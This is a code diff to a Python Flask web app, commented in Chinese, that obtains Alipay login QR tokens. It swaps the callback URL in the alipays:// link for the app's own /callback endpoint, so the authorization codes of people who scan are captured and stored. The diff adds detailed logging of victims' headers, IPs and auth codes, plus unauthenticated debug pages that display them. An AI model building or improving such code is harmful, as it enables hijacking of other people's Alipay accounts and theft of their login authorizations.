@@ -22,6 +22,8 @@ import requests
 from flask import Flask, request, redirect, jsonify, Response
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
+import logging
+
 app = Flask(__name__)
 
 # ==================== 配置 ====================
@@ -51,6 +53,23 @@ config = {
 authcodes = []  # [{'authCode': '...', 'time': '...', 'ip': '...'}]
 lock = threading.Lock()
 
+# ==================== 调试日志 ====================
+# 内存中的调试日志（最多保留200条）
+debug_logs = []
+DEBUG_LOG_MAX = 200
+debug_lock = threading.Lock()
+
+
+def debug_log(msg: str, level: str = "INFO"):
+    """写入调试日志（同时打印到 stdout）"""
+    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
+    entry = f"[{ts}] [{level}] {msg}"
+    print(entry)  # Railway 会收集 stdout
+    with debug_lock:
+        debug_logs.append(entry)
+        if len(debug_logs) > DEBUG_LOG_MAX:
+            del debug_logs[:50]
+
 
 def get_base_url():
     return request.host_url.rstrip('/')
@@ -62,25 +81,43 @@ def fetch_fresh_token_and_url():
     关键：修改回调 URL 为我们自己的服务器
     """
     headers = dict(API_HEADERS)
+    debug_log(f"[API] 请求 getLoginToken...")
     try:
         resp = requests.post(API_URL, headers=headers, json={}, timeout=10)
+        debug_log(f"[API] 响应状态码: {resp.status_code}")
+        debug_log(f"[API] 响应长度: {len(resp.text)}")
+
         data = resp.json()
+        debug_log(f"[API] success={data.get('success')}")
+        debug_log(f"[API] data keys: {list(data.get('data', {}).keys()) if data.get('data') else 'N/A'}")
+
         if data.get('success'):
             qr_code = data['data']['qrCode']
             token = qr_code['token']
             original_url = qr_code['url']  # alipays://... 的链接
 
+            debug_log(f"[API] token={token[:20]}... (len={len(token)})")
+            debug_log(f"[API] original_url (前150字符): {original_url[:150]}")
+            debug_log(f"[API] original_url 完整长度: {len(original_url)}")
+
             # 解析 alipays:// URL 中的回调地址
-            # 格式通常是: alipays://platformapi/startapp?appId=xxx&url=ENCODED_CALLBACK_URL
-            # 我们需要把 url 参数替换为指向我们自己的 /callback
             callback_url = f"{get_base_url()}/callback"
+            debug_log(f"[API] 目标 callback_url: {callback_url}")
 
             # 尝试修改回调地址
             modified_url = _modify_callback_in_url(original_url, callback_url)
+            debug_log(f"[API] modified_url (前200字符): {modified_url[:200]}")
+
+            if modified_url != original_url:
+                debug_log(f"[API] URL 已修改 (回调地址已替换)")
+            else:
+                debug_log(f"[API] !!! WARNING: URL 未被修改! 原始URL格式可能不符合预期")
 
             return token, modified_url
+        else:
+            debug_log(f"[API] 请求失败: {data.get('msg', 'unknown')}", "ERROR")
     except Exception as e:
-        app.logger.error(f"fetch_fresh_token error: {e}")
+        debug_log(f"[API] 异常: {type(e).__name__}: {e}", "ERROR")
     return None, None
 
 
@@ -89,25 +126,52 @@ def _modify_callback_in_url(original_url: str, new_callback: str) -> str:
     修改 alipays:// URL 中的回调地址
     alipays URL 格式: alipays://platformapi/startapp?appId=xxx&url=ENCODED_URL
     """
-    from urllib.parse import parse_qs, urlparse, urlencode, urlunparse, quote
+    from urllib.parse import parse_qs, urlparse, urlencode, urlunparse, quote, unquote
+
+    debug_log(f"[MODIFY] 原始URL: {original_url[:300]}")
+    debug_log(f"[MODIFY] 新callback: {new_callback}")
 
     # alipays:// 协议需要特殊处理
     if original_url.startswith('alipays://'):
+        debug_log(f"[MODIFY] 检测到 alipays:// 协议")
         # 提取 query 部分
         if '?' in original_url:
             path_part, query_part = original_url.split('?', 1)
+            debug_log(f"[MODIFY] path_part: {path_part}")
+            debug_log(f"[MODIFY] query_part (前200): {query_part[:200]}")
+
             params = parse_qs(query_part)
+            debug_log(f"[MODIFY] 解析出参数: {list(params.keys())}")
+
+            # 打印所有参数值（截断）
+            for k, v in params.items():
+                debug_log(f"[MODIFY]   {k} = {str(v)[:100]}")
 
             # 替换 url 参数为我们的回调
-            # 原始 url 参数通常是编码过的支付宝回调
             params['url'] = [new_callback]
 
             # 重新编码
             new_query = urlencode(params, doseq=True)
-            return f"{path_part}?{new_query}"
+            result = f"{path_part}?{new_query}"
+            debug_log(f"[MODIFY] 修改后URL (前200): {result[:200]}")
+            return result
+        else:
+            debug_log(f"[MODIFY] URL 中没有 ? 号，无法解析参数", "WARN")
 
-    # 如果不是 alipays:// 格式，尝试作为普通 URL 处理
+    # 如果不是 alipays:// 格式
+    debug_log(f"[MODIFY] URL 不是 alipays:// 开头，原样返回", "WARN")
     return original_url
+
+
+# ==================== 全局请求日志 ====================
+@app.before_request
+def log_all_requests():
+    """记录所有请求，方便排查"""
+    if request.path.startswith('/static'):
+        return  # 跳过静态文件
+    debug_log(f"[REQ] {request.method} {request.path} from {request.remote_addr}")
+    if request.query_string:
+        debug_log(f"[REQ]   query: {request.query_string.decode('utf-8', errors='replace')[:300]}")
 
 
 # ==================== 页面路由 ====================
@@ -196,19 +260,26 @@ def index():
 @app.route('/login')
 def login():
     """核心：扫码入口 - 实时获取新token并重定向到支付宝"""
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    debug_log(f"[LOGIN] ========== 新扫码请求 ==========")
+    debug_log(f"[LOGIN] 客户端IP: {client_ip}")
+    debug_log(f"[LOGIN] User-Agent: {request.headers.get('User-Agent', 'N/A')}")
+    debug_log(f"[LOGIN] Referer: {request.headers.get('Referer', 'N/A')}")
+    debug_log(f"[LOGIN] 完整请求头:")
+    for k, v in request.headers:
+        debug_log(f"[LOGIN]   {k}: {v}")
+
     with lock:
         config["scan_count"] += 1
-
-    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    app.logger.info(f"[SCAN] {client_ip} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
 
     token, redirect_url = fetch_fresh_token_and_url()
 
     if redirect_url:
-        app.logger.info(f"[SCAN] OK -> redirecting to Alipay")
+        debug_log(f"[LOGIN] -> 302 重定向到支付宝")
+        debug_log(f"[LOGIN] -> redirect_url: {redirect_url[:200]}")
         return redirect(redirect_url, code=302)
     else:
-        app.logger.error(f"[SCAN] FAILED to get token")
+        debug_log(f"[LOGIN] FAILED: 无法获取 token", "ERROR")
         return Response("Server error, please try again later", status=503)
 
 
@@ -221,37 +292,66 @@ def callback():
     params = dict(request.args)
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-    app.logger.info(f"[CALLBACK] from {client_ip}")
-    app.logger.info(f"[CALLBACK] params keys: {list(params.keys())}")
-    app.logger.info(f"[CALLBACK] full params: {json.dumps(params, ensure_ascii=False)}")
+    debug_log(f"[CALLBACK] ========== 收到回调 ==========")
+    debug_log(f"[CALLBACK] IP: {client_ip}")
+    debug_log(f"[CALLBACK] 方法: {request.method}")
+    debug_log(f"[CALLBACK] 完整URL: {request.url}")
+    debug_log(f"[CALLBACK] Content-Type: {request.headers.get('Content-Type', 'N/A')}")
+    debug_log(f"[CALLBACK] User-Agent: {request.headers.get('User-Agent', 'N/A')[:100]}")
+    debug_log(f"[CALLBACK] Referer: {request.headers.get('Referer', 'N/A')}")
+
+    # 打印所有 query 参数
+    debug_log(f"[CALLBACK] Query 参数 ({len(params)} 个):")
+    for k, v in params.items():
+        debug_log(f"[CALLBACK]   {k} = {str(v)[:200]}")
+
+    # 如果有 POST body 也打印
+    if request.method == 'POST':
+        debug_log(f"[CALLBACK] POST body: {request.get_data(as_text=True)[:500]}")
+
+    # 检查 request.form
+    form_data = dict(request.form)
+    if form_data:
+        debug_log(f"[CALLBACK] Form 数据 ({len(form_data)} 个):")
+        for k, v in form_data.items():
+            debug_log(f"[CALLBACK]   form[{k}] = {str(v)[:200]}")
 
     # 尝试从多个可能的参数名中提取 authCode
-    auth_code = (
-        params.get('authCode', [None])[0]
-        or params.get('code', [None])[0]
-        or params.get('auth_code', [None])[0]
-        or params.get('token', [None])[0]
-    )
+    auth_code = None
+    for key_name in ['authCode', 'code', 'auth_code', 'token', 'authToken']:
+        val = params.get(key_name)
+        if val:
+            auth_code = val[0] if isinstance(val, list) else val
+            if auth_code:
+                debug_log(f"[CALLBACK] 从 '{key_name}' 找到 authCode: {auth_code[:20]}... (len={len(auth_code)})")
+                break
+
+    if not auth_code:
+        # 也检查 form data
+        for key_name in ['authCode', 'code', 'auth_code', 'token', 'authToken']:
+            val = form_data.get(key_name)
+            if val:
+                auth_code = str(val)
+                debug_log(f"[CALLBACK] 从 form '{key_name}' 找到 authCode: {auth_code[:20]}... (len={len(auth_code)})")
+                break
 
     entry = {
         'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
         'ip': client_ip,
         'authCode': auth_code,
         'params': params,
+        'url': request.url,
+        'form': form_data,
     }
 
     with lock:
         authcodes.append(entry)
 
-    # 同时也保留旧格式的 accounts 记录（兼容）
-    account_entry = {
-        'time': entry['time'],
-        'ip': client_ip,
-        'params': params
-    }
-
     if auth_code:
-        app.logger.info(f"[CALLBACK] Got authCode! length={len(auth_code)}")
+        debug_log(f"[CALLBACK] 成功获取 authCode!")
+    else:
+        debug_log(f"[CALLBACK] !!! 未找到 authCode !!! 所有参数已记录", "WARN")
+        debug_log(f"[CALLBACK] 提示: 支付宝可能没有回调到此URL，请检查 alipays:// 链接中的回调配置", "WARN")
 
     return f"""<!DOCTYPE html>
 <html lang="zh-CN">
@@ -336,6 +436,85 @@ def health():
         "pending_authcodes": len(authcodes),
         "time": datetime.now().isoformat()
     })
+
+
+@app.route('/api/debug/logs')
+def get_debug_logs():
+    """获取调试日志"""
+    with debug_lock:
+        return jsonify({
+            "ok": True,
+            "count": len(debug_logs),
+            "logs": debug_logs
+        })
+
+
+@app.route('/api/debug/clear', methods=['POST'])
+def clear_debug_logs():
+    """清空调试日志"""
+    with debug_lock:
+        count = len(debug_logs)
+        debug_logs.clear()
+    return jsonify({"ok": True, "msg": f"Cleared {count} logs"})
+
+
+@app.route('/debug')
+def debug_page():
+    """调试日志页面 - 在浏览器直接查看"""
+    with debug_lock:
+        logs_html = "\n".join(
+            f"<tr><td>{line}</td></tr>"
+            for line in debug_logs[-100:]  # 最近100条
+        )
+
+    return f"""<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>调试日志 - 时光杂货店</title>
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        body {{
+            font-family: 'Consolas', 'Monaco', monospace;
+            background: #1e1e1e; color: #d4d4d4;
+            padding: 20px;
+        }}
+        h1 {{ color: #4ec9b0; margin-bottom: 10px; font-size: 18px; }}
+        .info {{ color: #999; margin-bottom: 15px; font-size: 12px; }}
+        table {{ width: 100%; border-collapse: collapse; font-size: 12px; }}
+        td {{ padding: 2px 8px; border-bottom: 1px solid #333; word-break: break-all; }}
+        tr:hover {{ background: #2d2d2d; }}
+        .warn {{ color: #dcdcaa; }}
+        .error {{ color: #f44747; }}
+        .refresh-btn {{
+            background: #0e639c; color: white; border: none;
+            padding: 8px 16px; border-radius: 4px; cursor: pointer;
+            margin-bottom: 15px; font-size: 13px;
+        }}
+        .refresh-btn:hover {{ background: #1177bb; }}
+        a {{ color: #4ec9b0; }}
+        .links {{ margin-top: 15px; font-size: 12px; }}
+        .links a {{ margin-right: 15px; }}
+    </style>
+</head>
+<body>
+    <h1>调试日志</h1>
+    <div class="info">
+        总计 {len(debug_logs)} 条日志 | 当前时间 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+    </div>
+    <button class="refresh-btn" onclick="location.reload()">刷新 (F5)</button>
+    <div class="links">
+        <a href="/">首页</a>
+        <a href="/api/authcodes">authcodes API</a>
+        <a href="/api/health">健康检查</a>
+        <a href="/api/debug/logs" target="_blank">JSON格式日志</a>
+    </div>
+    <table>
+        {logs_html or '<tr><td>暂无日志</td></tr>'}
+    </table>
+</body>
+</html>"""
 
 
 # ==================== 启动 ====================
